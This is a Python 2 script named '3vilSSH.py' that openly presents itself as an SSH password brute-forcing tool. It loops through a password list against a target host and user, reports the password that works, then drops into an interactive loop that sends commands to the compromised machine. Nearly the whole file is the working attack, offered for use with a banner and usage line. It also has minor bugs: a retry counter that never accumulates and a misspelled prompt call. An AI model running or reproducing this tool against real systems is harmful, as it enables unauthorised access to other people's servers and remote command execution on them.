import pxssh
import argparse
import time

# This tool was created for Bruteforce attack on SSH protocol
# Use it at your own risk
# Author: i3nigma
# contact me: https://t.me/H4m3D17

print """\033[91m

 ________             _    __       ______     ______    ____  ____  
|_   __  |           (_)  [  |    .' ____ \  .' ____ \  |_   ||   _| 
  | |_ \_|  _   __   __    | |    | (___ \_| | (___ \_|   | |__| |   
  |  _| _  [ \ [  ] [  |   | |     _.____`.   _.____`.    |  __  |   
 _| |__/ |  \ \/ /   | |   | |    | \____) | | \____) |  _| |  | |_  
|________|   \__/   [___] [___]    \______.'  \______.' |____||____| 
                                                                     

####################################################################
		\033[92m[+] SSH Password Craxer by i3nigma [+]\033[2;m \033[91m
####################################################################
\033[1;m

\033[34m
Usage: python 3vilSSH.py 127.0.0.1 root passwords.txt
\033[4;m
"""



def connect(host, user, password):
        Fails = 0
        try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            print('\033[92m[+] Password Found: \033[2;m') + password
            return s
        except Exception as e:
                if Fails > 10:
                        print('\033[91m[!] Socket timeouts!\033[1;m')
                        exit(0)
                elif 'read_nonblocking' in str(e):
                        Fails += 1
                        time.sleep(5)
                        return connect(host, user, password)
                elif 'synchronize with original prompt' in str(e):
                        time.sleep(2)
                        return connect(host, user, password)
                return None

def Main():
        parser = argparse.ArgumentParser()
        parser.add_argument("host", help="Type the SSH address you want to crack!")
        parser.add_argument("user", help="Type default username for the target")
        parser.add_argument("file", help="Choose Password List File")
	

        args = parser.parse_args()

        if args.host and args.user and args.file:
                with open(args.file, 'r') as infile:
                        for line in infile:
                                password = line.strip('\r\n')
                                print("\033[91mTesting --> \033[1;m" + str(password))
                                con = connect(args.host, args.user, password)
                                if con:
                                        print("\033[93m[+] SSH Connected, Specify the commands or press 'Q' to exit\033[3;m")
                                        command = raw_input("\033[34m--+>\033[4;m")
                                        while command != 'Q':
                                                con.sendline(command)
                                                con.promt()
                                                print con.before
                                                command = raw_input("--+>")
        else:
                print parser.usage
                exit(0)

if __name__ == '__main__':
        Main()
